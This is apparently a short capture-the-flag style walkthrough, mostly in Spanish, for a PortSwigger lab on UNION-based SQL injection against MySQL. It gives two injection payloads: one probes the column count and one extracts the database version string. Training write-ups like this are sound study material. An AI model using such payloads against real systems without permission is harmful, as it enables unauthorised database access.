# 6 - Idem on mysql

> This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
>
>  To solve the lab, display the database version string.

* Similar al anterior realizamos  `'+UNION+SELECT+'abc','def'#`
* Eso nos muestra el retorno de dos columnas entonces hacemos lo siguiente:  '+UNION+SELECT+@@version,+NULL\#

\`\`

